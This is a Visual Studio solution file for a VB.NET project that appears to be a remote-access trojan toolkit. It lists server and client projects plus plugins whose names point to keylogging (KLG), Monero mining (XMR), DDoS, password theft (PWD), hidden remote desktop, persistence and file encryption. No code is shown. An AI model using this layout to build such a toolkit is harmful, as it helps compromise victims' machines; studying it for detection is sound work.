
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.27703.2000
MinimumVisualStudioVersion = 10.0.40219.1
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "Server", "Project\Server\Server.vbproj", "{B672DE08-269D-4AA6-8535-D3BC59BB086B}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "Client", "Project\Client\Client.vbproj", "{1E2A1E78-ED0B-414B-A956-86232B1025BE}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Plugins", "Plugins", "{7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "DEC", "Project\Plugins\DEC\DEC.vbproj", "{E211C5CD-85F0-48D2-A18F-2E59AD47DDC3}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "DET", "Project\Plugins\DET\DET.vbproj", "{55625889-F7BB-4533-9702-DDE98FBB0DDF}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "ENC", "Project\Plugins\ENC\ENC.vbproj", "{CFE81801-C2C5-4444-BE67-64EFFEFDCD73}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "FM", "Project\Plugins\FM\FM.vbproj", "{73EF1630-1208-43C5-9E3F-19A2923875C5}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "PIN", "Project\Plugins\PIN\PIN.vbproj", "{8F71C671-F53C-4F4F-98B9-8B8D3263C0DB}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "PWD", "Project\Plugins\PWD\PWD.vbproj", "{9C30CAE4-6FBE-45CC-90C2-1D739DB92E86}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "RDP", "Project\Plugins\RDP\RDP.vbproj", "{733C37D8-858F-44EE-9D17-790F7DE9C040}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "USB", "Project\Plugins\USB\USB.vbproj", "{D47C706B-152F-46B5-840A-4EBB2CFAFE33}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "LOC", "Project\Plugins\LOC\LOC.vbproj", "{A0E096FB-3AEF-41B5-A67B-BD90D2FEBBFC}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "DECF", "Project\Plugins\DECF\DECF.vbproj", "{27CF1AE0-5FDE-4B31-A4DA-6FAD1D77351D}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "LOCS", "Project\Plugins\LOCS\LOCS.vbproj", "{2B47F84C-9CA3-47E9-9970-8AF8233A9F12}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "PCL", "Project\Plugins\PCL\PCL.vbproj", "{73ECE052-4218-465D-AA2E-A2D03448BEDD}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "MISC", "Project\Plugins\MISC\MISC.vbproj", "{363A6DE4-59D9-451B-A4FD-1FE763970E1E}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "CRYP", "Project\Plugins\CRYP\CRYP.vbproj", "{AF0885E4-9E3B-49CA-9F13-0F869E8BF89D}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "KLG", "Project\Plugins\KLG\KLG.vbproj", "{CF8C386C-46B2-4F40-BCB1-774C01E72B1C}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "XMR", "Project\Plugins\XMR\XMR.vbproj", "{6E25C93C-0985-4D6E-A4C3-89D10F4F4F5F}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "DDOS", "Project\Plugins\DDOS\DDOS.vbproj", "{F56E4E1A-AB7A-4494-ACB9-8757164B0524}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "WRDP", "Project\Plugins\WRDP\WRDP.vbproj", "{86FC4B74-3B12-4C72-AA6C-084BF98E5E9A}"
EndProject
Project("{F184B08F-C81C-45F6-A57F-5ABD9991F28F}") = "PERS", "Project\Plugins\PERS\PERS.vbproj", "{116472CE-3924-40EA-90F9-50A1A00D0EC5}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{B672DE08-269D-4AA6-8535-D3BC59BB086B}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{B672DE08-269D-4AA6-8535-D3BC59BB086B}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{B672DE08-269D-4AA6-8535-D3BC59BB086B}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{B672DE08-269D-4AA6-8535-D3BC59BB086B}.Release|Any CPU.Build.0 = Release|Any CPU
		{1E2A1E78-ED0B-414B-A956-86232B1025BE}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{1E2A1E78-ED0B-414B-A956-86232B1025BE}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{1E2A1E78-ED0B-414B-A956-86232B1025BE}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{1E2A1E78-ED0B-414B-A956-86232B1025BE}.Release|Any CPU.Build.0 = Release|Any CPU
		{E211C5CD-85F0-48D2-A18F-2E59AD47DDC3}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{E211C5CD-85F0-48D2-A18F-2E59AD47DDC3}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{E211C5CD-85F0-48D2-A18F-2E59AD47DDC3}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{E211C5CD-85F0-48D2-A18F-2E59AD47DDC3}.Release|Any CPU.Build.0 = Release|Any CPU
		{55625889-F7BB-4533-9702-DDE98FBB0DDF}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{55625889-F7BB-4533-9702-DDE98FBB0DDF}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{55625889-F7BB-4533-9702-DDE98FBB0DDF}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{55625889-F7BB-4533-9702-DDE98FBB0DDF}.Release|Any CPU.Build.0 = Release|Any CPU
		{CFE81801-C2C5-4444-BE67-64EFFEFDCD73}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{CFE81801-C2C5-4444-BE67-64EFFEFDCD73}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{CFE81801-C2C5-4444-BE67-64EFFEFDCD73}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{CFE81801-C2C5-4444-BE67-64EFFEFDCD73}.Release|Any CPU.Build.0 = Release|Any CPU
		{73EF1630-1208-43C5-9E3F-19A2923875C5}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{73EF1630-1208-43C5-9E3F-19A2923875C5}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{73EF1630-1208-43C5-9E3F-19A2923875C5}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{73EF1630-1208-43C5-9E3F-19A2923875C5}.Release|Any CPU.Build.0 = Release|Any CPU
		{8F71C671-F53C-4F4F-98B9-8B8D3263C0DB}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{8F71C671-F53C-4F4F-98B9-8B8D3263C0DB}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{8F71C671-F53C-4F4F-98B9-8B8D3263C0DB}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{8F71C671-F53C-4F4F-98B9-8B8D3263C0DB}.Release|Any CPU.Build.0 = Release|Any CPU
		{9C30CAE4-6FBE-45CC-90C2-1D739DB92E86}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{9C30CAE4-6FBE-45CC-90C2-1D739DB92E86}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{9C30CAE4-6FBE-45CC-90C2-1D739DB92E86}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{9C30CAE4-6FBE-45CC-90C2-1D739DB92E86}.Release|Any CPU.Build.0 = Release|Any CPU
		{733C37D8-858F-44EE-9D17-790F7DE9C040}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{733C37D8-858F-44EE-9D17-790F7DE9C040}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{733C37D8-858F-44EE-9D17-790F7DE9C040}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{733C37D8-858F-44EE-9D17-790F7DE9C040}.Release|Any CPU.Build.0 = Release|Any CPU
		{D47C706B-152F-46B5-840A-4EBB2CFAFE33}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{D47C706B-152F-46B5-840A-4EBB2CFAFE33}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{D47C706B-152F-46B5-840A-4EBB2CFAFE33}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{D47C706B-152F-46B5-840A-4EBB2CFAFE33}.Release|Any CPU.Build.0 = Release|Any CPU
		{A0E096FB-3AEF-41B5-A67B-BD90D2FEBBFC}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{A0E096FB-3AEF-41B5-A67B-BD90D2FEBBFC}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{A0E096FB-3AEF-41B5-A67B-BD90D2FEBBFC}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{A0E096FB-3AEF-41B5-A67B-BD90D2FEBBFC}.Release|Any CPU.Build.0 = Release|Any CPU
		{27CF1AE0-5FDE-4B31-A4DA-6FAD1D77351D}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{27CF1AE0-5FDE-4B31-A4DA-6FAD1D77351D}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{27CF1AE0-5FDE-4B31-A4DA-6FAD1D77351D}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{27CF1AE0-5FDE-4B31-A4DA-6FAD1D77351D}.Release|Any CPU.Build.0 = Release|Any CPU
		{2B47F84C-9CA3-47E9-9970-8AF8233A9F12}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{2B47F84C-9CA3-47E9-9970-8AF8233A9F12}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{2B47F84C-9CA3-47E9-9970-8AF8233A9F12}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{2B47F84C-9CA3-47E9-9970-8AF8233A9F12}.Release|Any CPU.Build.0 = Release|Any CPU
		{73ECE052-4218-465D-AA2E-A2D03448BEDD}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{73ECE052-4218-465D-AA2E-A2D03448BEDD}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{73ECE052-4218-465D-AA2E-A2D03448BEDD}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{73ECE052-4218-465D-AA2E-A2D03448BEDD}.Release|Any CPU.Build.0 = Release|Any CPU
		{363A6DE4-59D9-451B-A4FD-1FE763970E1E}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{363A6DE4-59D9-451B-A4FD-1FE763970E1E}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{363A6DE4-59D9-451B-A4FD-1FE763970E1E}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{363A6DE4-59D9-451B-A4FD-1FE763970E1E}.Release|Any CPU.Build.0 = Release|Any CPU
		{AF0885E4-9E3B-49CA-9F13-0F869E8BF89D}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{AF0885E4-9E3B-49CA-9F13-0F869E8BF89D}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{AF0885E4-9E3B-49CA-9F13-0F869E8BF89D}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{AF0885E4-9E3B-49CA-9F13-0F869E8BF89D}.Release|Any CPU.Build.0 = Release|Any CPU
		{CF8C386C-46B2-4F40-BCB1-774C01E72B1C}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{CF8C386C-46B2-4F40-BCB1-774C01E72B1C}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{CF8C386C-46B2-4F40-BCB1-774C01E72B1C}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{CF8C386C-46B2-4F40-BCB1-774C01E72B1C}.Release|Any CPU.Build.0 = Release|Any CPU
		{6E25C93C-0985-4D6E-A4C3-89D10F4F4F5F}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{6E25C93C-0985-4D6E-A4C3-89D10F4F4F5F}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{6E25C93C-0985-4D6E-A4C3-89D10F4F4F5F}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{6E25C93C-0985-4D6E-A4C3-89D10F4F4F5F}.Release|Any CPU.Build.0 = Release|Any CPU
		{F56E4E1A-AB7A-4494-ACB9-8757164B0524}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{F56E4E1A-AB7A-4494-ACB9-8757164B0524}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{F56E4E1A-AB7A-4494-ACB9-8757164B0524}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{F56E4E1A-AB7A-4494-ACB9-8757164B0524}.Release|Any CPU.Build.0 = Release|Any CPU
		{86FC4B74-3B12-4C72-AA6C-084BF98E5E9A}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{86FC4B74-3B12-4C72-AA6C-084BF98E5E9A}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{86FC4B74-3B12-4C72-AA6C-084BF98E5E9A}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{86FC4B74-3B12-4C72-AA6C-084BF98E5E9A}.Release|Any CPU.Build.0 = Release|Any CPU
		{116472CE-3924-40EA-90F9-50A1A00D0EC5}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{116472CE-3924-40EA-90F9-50A1A00D0EC5}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{116472CE-3924-40EA-90F9-50A1A00D0EC5}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{116472CE-3924-40EA-90F9-50A1A00D0EC5}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{E211C5CD-85F0-48D2-A18F-2E59AD47DDC3} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{55625889-F7BB-4533-9702-DDE98FBB0DDF} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{CFE81801-C2C5-4444-BE67-64EFFEFDCD73} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{73EF1630-1208-43C5-9E3F-19A2923875C5} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{8F71C671-F53C-4F4F-98B9-8B8D3263C0DB} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{9C30CAE4-6FBE-45CC-90C2-1D739DB92E86} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{733C37D8-858F-44EE-9D17-790F7DE9C040} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{D47C706B-152F-46B5-840A-4EBB2CFAFE33} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{A0E096FB-3AEF-41B5-A67B-BD90D2FEBBFC} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{27CF1AE0-5FDE-4B31-A4DA-6FAD1D77351D} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{2B47F84C-9CA3-47E9-9970-8AF8233A9F12} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{73ECE052-4218-465D-AA2E-A2D03448BEDD} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{363A6DE4-59D9-451B-A4FD-1FE763970E1E} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{AF0885E4-9E3B-49CA-9F13-0F869E8BF89D} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{CF8C386C-46B2-4F40-BCB1-774C01E72B1C} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{6E25C93C-0985-4D6E-A4C3-89D10F4F4F5F} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{F56E4E1A-AB7A-4494-ACB9-8757164B0524} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{86FC4B74-3B12-4C72-AA6C-084BF98E5E9A} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
		{116472CE-3924-40EA-90F9-50A1A00D0EC5} = {7D34A64F-BEA5-42D4-A3FB-D9972BB33BEC}
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D2B7BDC0-251E-4521-91E5-76CD9CF13D23}
	EndGlobalSection
EndGlobal
